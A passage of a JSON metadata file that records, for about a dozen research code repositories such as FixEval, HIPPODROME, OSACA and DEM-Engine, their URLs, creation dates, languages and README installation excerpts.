                    "value": "https://github.com/fstiehle/SLR-blockchain-BP-execution",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-03-15T21:29:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-01-27T12:34:22Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 18232
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 7108
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "263": {
        "filename": "mahimanzum_FixEval_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/mahimanzum/FixEval",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Source code repositories consist of large codebases, often containing error-prone programs. The increasing complexity of software has led to a drastic rise in time and costs for identifying and fixing these defects. Various methods exist to automatically generate fixes for buggy code. However, due to the large combinatorial space of possible solutions for a particular bug, there are not many tools and datasets available to evaluate generated code effectively. In this work, we introduce FixEval, a benchmark comprising buggy code submissions to competitive programming problems and their respective fixes. We introduce a richtest suite to evaluate and assess the correctness of model-generated program fixes. We consider two Transformer language models pretrained on programming languages as our baselines, and compare them using match-based and execution-based evaluation metrics. Our experiments show that match-based metrics do not reflect model-generated program fixes accurately, while execution-based methods evaluate programs through all cases and scenarios specifically designed for that solution. Therefore, we believe FixEval provides a step towards real-world automatic bug fixing and model-generated code evaluation.\n",
                    "type": "Text_excerpt",
                    "original_header": "Abstract:",
                    "parent_header": [
                        "Official Code for <a href=\"https://arxiv.org/abs/2206.07796\">FixEval: Execution-based Evaluation of Program Fixes for Competitive Programming Problems</a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mahimanzum/FixEval/main/README.md"
            },
            {
                "result": {
                    "value": "The preferred installation method is to run this command (You may need to change the bash file to update the environment names, etc.):\n```\nbash install_env.sh\n```\n\nAnother method is to run the following (You may need to manually add some libraries): \n```\nconda env create -n python -f src/environment.yml\nconda activate python36\n```\nAll the commands below assume that you installed everything in this environment correctly and activated the environment. \n",
                    "type": "Text_excerpt",
                    "original_header": "Installation"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/mahimanzum/FixEval/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\n\n\u251c\u2500\u2500 codet5\n\u2502   \u251c\u2500\u2500 run.sh \n\u2502   \u251c\u2500\u2500 configs.py\n\u2502   \u251c\u2500\u2500 models.py\n\u2502   \u251c\u2500\u2500 run_gen.py\n\u2502   \u2514\u2500\u2500 ...\n\u2502 \n\u251c\u2500\u2500 plbart\n\u2502   \u251c\u2500\u2500 run.sh \n\u2502   \u251c\u2500\u2500 configs.py\n\u2502   \u251c\u2500\u2500 models.py\n\u2502   \u251c\u2500\u2500 run_gen.py\n\u2502   \u2514\u2500\u2500 ...\n\u2502\n\u251c\u2500\u2500 data\n\u2502   \u251c\u2500\u2500 java\n\u2502   \u2502    \u251c\u2500\u2500jsons\n\u2502   \u2502    \u251c\u2500\u2500processed\n\u2502   \u251c\u2500\u2500 python\n\u2502   \u2502    \u251c\u2500\u2500jsons\n\u2502   \u2502    \u251c\u2500\u2500processed\n\u2502   \u251c\u2500\u2500 atcoder_test_cases\n\u2502   \u2514\u2500\u2500 processed.json\n\u2502\n\u251c\u2500\u2500 third_party\n\u2502   \u251c\u2500\u2500 apex\n\u2502   \u251c\u2500\u2500 fairseq\n\u2502   \u251c\u2500\u2500 tree-sitter-cpp\n\u2502   \u251c\u2500\u2500 tree-sitter-java\n\u2502   \u2514\u2500\u2500 tree-sitter-python\n\u2502\n\u251c\u2500\u2500 evaluation\n\u2502   \u251c\u2500\u2500 CodeBLEU \n\u2502   \u251c\u2500\u2500 codegen \n\u2502   \u251c\u2500\u2500 bleu.py\n\u2502   \u251c\u2500\u2500 compile.py\n\u2502   \u251c\u2500\u2500 compute_ca.py\n\u2502   \u251c\u2500\u2500 evaluator.py\n\u2502   \u251c\u2500\u2500 execution_evaluation_TC_arc_MP.py\n\u2502   \u2514\u2500\u2500 ...\n\u2502\n\u2514\u2500\u2500 src\n    \u251c\u2500\u2500 01_preprocessing.ipynb\n    \u251c\u2500\u2500 make_submission_list_json.py\n    \u251c\u2500\u2500 process_json.py\n    \u251c\u2500\u2500 deduplication.py\n    \u251c\u2500\u2500 generate_eval_files.py\n    \u251c\u2500\u2500 merge.py\n    \u251c\u2500\u2500 split.py\n    \u2514\u2500\u2500 ...\n```\n \n",
                    "original_header": "Folder Structure"
                },
                "confidence": 0.999999967696852,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mahimanzum/FixEval/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the following commands in the root folder.\n \n",
                    "original_header": "Dataset"
                },
                "confidence": 0.9921731890291018,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mahimanzum/FixEval/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Go to the specific model folder and execute the `run.sh` command with only the `generate` function uncommented and `save_dir`, `path_2_data`, and `languages` set to the correct versions. For example:\n```\ncd plbart/\n./run.sh\n```\nTo use our open sourced pretrained models, download plbart.zip or codeT5.zip from the link below and verify the results using the same procedure.\nBASH2* \n",
                    "original_header": "Let's generate the file with the model predictions"
                },
                "confidence": 0.9934831386736689,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mahimanzum/FixEval/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "First, we need to create a self-contained json with all of the necessary versions to detokenize the code and execute. We split this portion explicitly because it is not possible to run the code and install all the libraries required to tokenize the Java and Python programs using the ARC (Advanced Research Computing) supercomputer at Virginia Tech. Thus, we do it elsewhere and create the resulting json file which can be used to generate results. \n```\ncd src/\npython merge.py --references data/java/processed/generation.json --language java\npython merge.py --references data/java/processed_with_verdict/generation.json --language java\npython merge.py --references data/python/processed/generation.json --language python\npython merge.py --references data/python/processed_with_verdict/generation.json --language python\ncd ../\n```\nThese will create 4 json files. You may need to change the output file names for your own clarification.\n \n",
                    "original_header": "Pre-preprocess the generated files that contains all tokenized and detokenized source, target, and predictions"
                },
                "confidence": 0.9999980503631284,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/mahimanzum/FixEval/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-02-06T15:01:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-07-11T06:00:34Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 1295668
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 498923
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 16723
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Perl",
                    "name": "Perl",
                    "type": "Programming_language",
                    "size": 10466
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 4475
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "264": {
        "filename": "jazzbob_bv_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/lenzbelzner/bv",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2017-02-27T15:17:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2017-03-15T18:03:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 9867
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "265": {
        "filename": "andrecostea_hippodrome_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/verse-lab/hippodrome",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. install antlr to your local maven repository:\n\n`mvn install:install-file -Dfile=\"<path-to-your-antlr-for-java-jar>\" -DgroupId=org.racerdfix.antlr -DartifactId=antlr -Dversion=1.0 -Dpackaging=jar`\n\n2. set the path to local `infer` (the version recommended earlier) and the options expected to run with in `src/main/resources/APP_CONFIG.json`:\n```json\n{\n  \"infer\": \"<path-to-infer>/infer/infer/bin/infer\",\n  \"infer_options\": [\"--racerdfix-only\", \"--starvation\", \"--no-deduplicate\", <list-of-strings-representing-additional-infer-options>],\n  \"json_path\": \"./infer-out/\",\n}\n```\nwhere\n* ``infer`` sets the path to the running infer\n* ``options`` sets the options passed to the infer process\n* ``json_path`` indicates the path to the directory where infer writes its reports\n \n\n3. install HIPPODROME:\n`mvn install` (from the project's main directory); \nuse `mvn install -Dmaven.test.skip=true` to skip the testing phase\n \n",
                    "type": "Text_excerpt",
                    "original_header": "Install HIPPODROME:",
                    "parent_header": [
                        "HIPPODROME",
                        "Setup and Build"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/andrecostea/hippodrome/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Solution: makes sure you have installed the infer version we recommended and that you have correctly set the path to this version in your `APP_CONFIG.json` file, or in `CONFIG.json`. \n",
                    "original_header": "Common execution issues"
                },
                "confidence": 0.999999644258174,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/andrecostea/hippodrome/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-07-22T01:53:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2023-04-09T14:14:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 162313
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Scala",
                    "name": "Scala",
                    "type": "Programming_language",
                    "size": 141937
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 335
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "266": {
        "filename": "RRZE-HPC_OSACA_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/RRZE-HPC/OSACA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "On most systems with python pip and setuputils installed, just run:\n\n.. code:: bash\n\n    pip install --user osaca\n\nfor the latest release.\n\nTo build OSACA from source, clone this repository using ``git clone https://github.com/RRZE-HPC/OSACA`` and run in the root directory:\n\n.. code:: bash\n\n   python ./setup.py install\n\nAfter installation, OSACA can be started with the command ``osaca`` in the CLI.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Getting started"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/RRZE-HPC/OSACA/master/README.rst"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": ".. image:: https://github.com/RRZE-HPC/OSACA/workflows/test-n-publish/badge.svg?branch=master&event=push\n    :target: https://github.com/RRZE-HPC/OSACA/actions\n    :alt: Build Status \n.. image:: https://codecov.io/github/RRZE-HPC/OSACA/coverage.svg?branch=master\n    :target: https://codecov.io/github/RRZE-HPC/OSACA?branch=master\n    :alt: Code Coverage \n.. image:: https://readthedocs.org/projects/osaca/badge/?version=latest\n    :target: https://osaca.readthedocs.io/en/latest/?badge=latest\n    :alt: Documentation Status \n.. image:: https://img.shields.io/badge/read-the_docs-blue\n    :target: https://osaca.readthedocs.io/\n    :alt: Docs \n.. image:: https://img.shields.io/badge/code%20style-black-000000.svg\n    :target: https://github.com/ambv/black\n    :alt: Code Style\n \n",
                    "original_header": "Open Source Architecture Code Analyzer"
                },
                "confidence": 0.9936267868676605,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/RRZE-HPC/OSACA/master/README.rst"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-03-02T13:07:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-01T10:00:57Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 2214214
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 537696
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Assembly",
                    "name": "Assembly",
                    "type": "Programming_language",
                    "size": 416762
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 35184
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "267": {
        "filename": "woc-hack_track_hack_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/woc-hack/track_hack",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-01-12T20:37:49Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-10-25T20:14:33Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 3071399
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 399
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "268": {
        "filename": "uclmr_pycodesuggest_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/uclnlp/pycodesuggest",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`python3 github-scraper/scraper.py --mode=recreate --outdir=<PATH-TO-OUTPUT-DIR> --dbfile=/FULL/PATH/TO/pycodesuggest/data/cloned_repos.dat --githubuser=<GITHUB USERNAME>` \nWhere outdir is the path on your local machine where the repos will be cloned. Note that the dbfile path should be the *full* path on your machine. You may be prompted for your Github password. \n`python3 github-scraper/scraper.py --mode=new --outdir=<PATH-TO-OUTPUT-DIR> --dbfile=cloned_repos.dat --githubuser=<GITHUB USERNAME>` \n",
                    "original_header": "Step 1: Cloning the Repos"
                },
                "confidence": 0.9923783817598686,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uclmr/pycodesuggest/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Linux/Mac OS: Run the following command in your output directory to remove non Python files \n",
                    "original_header": "Step 2: (OPTIONAL): Remove unnecessary files"
                },
                "confidence": 0.9999945120484124,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uclmr/pycodesuggest/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Run the following command to normalise all files with a .py extension by providing the output directory of step 1 as the path. The normalised files will be written to a new directory with \"normalised\" appended to the path.  \n`python3 github-scraper/normalisation.py --path=<PATH TO DOWNLOADED CORPUS>` \nFiles which can't be parsed as valid Python3 will be ignored. The list of successfully processed files is written to PATH/processed.txt which also allows for the normalisation to continue if interrupted. \n \n",
                    "original_header": "Step 3: Normalisation"
                },
                "confidence": 0.9839889145044789,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uclmr/pycodesuggest/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "To use the same train/dev/test split as used in the paper, copy the files train_files.txt, valid_files.txt and test_files.txt from the data directory into the downloaded corpus and normalised corpus directories. \nTo generate a new split, run the following command which generates the list of train files (train_files.txt), validation files (valid_files.txt) and test files (test_files.txt) in the ratio 0.5/0.2/0.3. Use the **normalised** path from the previous step. This will ensure that the list of files is available in both the normalised and unnormalised data sets.  \n`python3 github-scraper/processFiles.py --path=<PATH TO NORMALISED CORPUS>` \n",
                    "original_header": "Step 4: Split into train/dev/test"
                },
                "confidence": 0.9989774203821393,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/uclmr/pycodesuggest/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2016-01-31T17:18:35Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-02-25T18:29:31Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 170626
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 243
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "269": {
        "filename": "projectchrono_DEM-Engine_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/projectchrono/DEM-Engine",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p>\n  <img width=\"380\" src=\"https://i.imgur.com/DKGlM14.jpg\">\n  <img width=\"380\" src=\"https://i.imgur.com/A3utANi.gif\">\n</p> \n",
                    "original_header": "SBEL GPU DEM-Engine"
                },
                "confidence": 0.9999640697078237,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/projectchrono/DEM-Engine/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<p>\n  <img width=\"380\" src=\"https://i.imgur.com/YOEbAd8.gif\">\n  <img width=\"380\" src=\"https://i.imgur.com/4R25TPX.gif\">\n</p> \n",
                    "original_header": "Description"
                },
                "confidence": 0.9999883833559414,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/projectchrono/DEM-Engine/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "<li><a href=\"#install-as-library\">Install as C++ library</a></li> \n_DEME_ is now available as a Python package, _pyDEME_. It is quick to install and pick up its usage by trying this Python version. If you want to maximize the performance and use the cutting-edge features, you can instead <a href=\"#compilation\">install the C++ version of _DEME_ from source</a>. \nTo install _pyDEME_, use a Linux machine, install CUDA if you do not already have it. Useful installation instructions may be found [here](https://developer.nvidia.com/cuda-downloads).  \nSome additional troubleshooting tips for getting CUDA ready: \n- I recommend getting the newest CUDA. But note that the recent releases CUDA 12.1, 12.2 and 12.3 appear to cause troubles with jitify and you should not use them with DEME.\n- On WSL this code may be buildable (and [this](https://docs.nvidia.com/cuda/wsl-user-guide/index.html) is the guide for installing CUDA on WSL), but may not run. This is due to the [many limitations on unified memory and pinned memory support](https://docs.nvidia.com/cuda/wsl-user-guide/index.html#known-limitations-for-linux-cuda-applications) on WSL. We are looking into it and for now, a native Linux machine or cluster is recommended. \nOnce CUDA is ready, you can `pip` install _pyDEME_. In your conda environement, do\n```\nconda create -n pyDEME python=3.11\nconda activate pyDEME\nconda install cmake\npip3 install DEME\n``` \n~~You can also install pyDEME via `conda install`:~~ (Please don't use `conda install` for now, it is not yet behaving correctly) \n~~`conda create -n pyDEME python=3.11`~~ \n~~`conda activate pyDEME`~~ \n~~`conda install -c projectchrono pydeme`~~ \nOn a Linux machine, [install CUDA](https://developer.nvidia.com/cuda-downloads). The newest release is recommended. \nOnce CUDA is ready, clone this project and then:\n```\ngit submodule init\ngit submodule update\n```\n \nThis will pull the submodule NVIDIA/jitify so that we can do runtime compilation.  \nThen, one typical choice is to make a build directory in it. Then in the build directory, use `cmake` to configure the compilation. An example:\n```\nmkdir build\ncd build\ncmake -DCMAKE_BUILD_TYPE=Release ..\n```\n \nYou may want to use [this information](https://askubuntu.com/questions/1203635/installing-latest-cmake-on-ubuntu-18-04-3-lts-run-via-wsl-openssl-error) if you need to update cmake to the newest.  \nWe suggest that you install a `cmake` GUI such as `ccmake`, and `ninja_build` generator, to better help you configure the project. In this case, the example above can be done like this alternatively:\n```\nmkdir build\ncd build\nccmake -G Ninja ..\n```\n \nYou generally do not have to change the build options in the GUI, but preferably you can change `CMAKE_BUILD_TYPE` to `Release`, and if you need to install this package as a library you can specify a `CMAKE_INSTALL_PREFIX`.  \n- If some dependencies such as CUB are not found, then you probably need to manually set `$PATH` and `$LD_LIBRARY_PATH`. An example is given below for a specific version of CUDA, note it may be different on your machine or cluster. You should also inspect if `nvidia-smi` and `nvcc --version` give correct returns.\n```\nexport CPATH=/usr/local/cuda-12.5/targets/x86_64-linux/include${CPATH:+:${CPATH}}\nexport PATH=/usr/local/cuda-12.5/bin${PATH:+:${PATH}}\nexport PATH=/usr/local/cuda-12.5/lib64/cmake${PATH:+:${PATH}}\nexport LD_LIBRARY_PATH=/usr/local/cuda-12.5/lib64${LD_LIBRARY_PATH:+:${LD_LIBRARY_PATH}}\nexport CUDA_HOME=/usr/local/cuda-12.5\n``` \n- If you see some grammatical errors during compilation, such as `filesystem` not being a member of `std` or arguments not expanded with `...`, then manually setting the flag `TargetCXXStandard` to `STD_CXX17` might help.\n- If CUB is not found, then you may manually set it in the `ccmake` GUI as `/usr/local/cuda/lib64/cmake/cub`. It may be a slightly different path on your machine or cluster.\n- If `libcudacxx` is not found, then you may manually set it in the `ccmake` GUI as `/usr/local/cuda-12.0/targets/x86_64-linux/lib/cmake/libcudacxx`. Depending on your CUDA version it may be a slightly different path on your machine or cluster. You may also try to find these packages using `find`. \n<h2 id=\"install-as-library\">Install as library</h2> \nSet the `CMAKE_INSTALL_PREFIX` flag in `cmake` GUI to your desired installation path and then \n```\nninja install\n```\n \nYou need to build `chrono-projects` linking against a Chrono installation (Chrono installation guide is [here](https://api.projectchrono.org/tutorial_install_chrono_linux.html); note you have to `make install` to install Chrono, not just build it), then link against _DEME_. The steps for building `chrono-projects`: \n- Start by linking against Chrono. Set `Chrono_DIR`. It should be in `<your_Chrono_install_dir>/lib/cmake`. Then configure the project;\n- Make sure `ENABLE_PROJECTS` to `ON` and configure the project;\n- Linkage against Chrono is done, now move on to link against _DEME_. Set `ENABLE_DEME_TESTS` to `ON`. Then configure the project;\n- Set `DEME_DIR` when prompted. It should be in `<your_DEME_install_dir>/lib64/cmake/DEME`. Then configure the project.\n- You may see the `ChPF_DIR` option being prompted. If you did not build _DEME_ with USE_CHPF being ON, you can ignore this option. Otherwise CMake will refuse to generate, and you need to set this option to be `<your_DEME_install_dir>/lib64/cmake/ChPF`. \n",
                    "original_header": "Quick links"
                },
                "confidence": 0.9925943232709334,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/projectchrono/DEM-Engine/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-04-22T19:11:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-12T02:57:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 1156163
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Cuda",
                    "name": "Cuda",
                    "type": "Programming_language",
                    "size": 332138
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CMake",
                    "name": "CMake",
                    "type": "Programming_language",
                    "size": 27300
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "270": {
        "filename": "dessertlab_JSSOFTWARE_Android_rejuvenation_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/dessertlab/JSSOFTWARE_Android_rejuvenation",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-06-07T15:18:53Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-06-07T16:16:46Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "271": {
        "filename": "ckaestne_seai_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/ckaestne/seai",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "We regularly use Slack for in-class activities. Please make sure that you have access to slack on a laptop, tablet, or mobile phone. \n",
                    "original_header": "Course Syllabus and Policies"
                },
                "confidence": 0.9254850869457087,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/ckaestne/seai/F2022/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2019-02-14T18:55:13Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-10-02T04:41:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 24102
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 15224
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 3456
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 2403
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 1610
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 160
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "272": {
        "filename": "selabhvl_cpnmcdctesting_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/selabhvl/cpnmcdctesting",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The original models are from:\n* CPNABS: https://github.com/natasa-gkolfi/cpnabs\n* Paxos: https://github.com/selabhvl/singleDecreePaxosCPN\n* DisCSP: https://github.com/carlospascal/DisCSP-CPN-Models\n* MQTT: https://bitbucket.org/alejandrort/mqtt-cpn-public/ \n",
                    "original_header": "Coverage Analysis of Net Inscriptions in Coloured Petri Net Models"
                },
                "confidence": 0.9999999978007992,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/selabhvl/cpnmcdctesting/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-01-19T14:17:01Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-04-08T18:51:39Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Rich Text Format",
                    "name": "Rich Text Format",
                    "type": "Programming_language",
                    "size": 13800070
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PostScript",
                    "name": "PostScript",
                    "type": "Programming_language",
                    "size": 1118748
                },
                "confidence": 1,
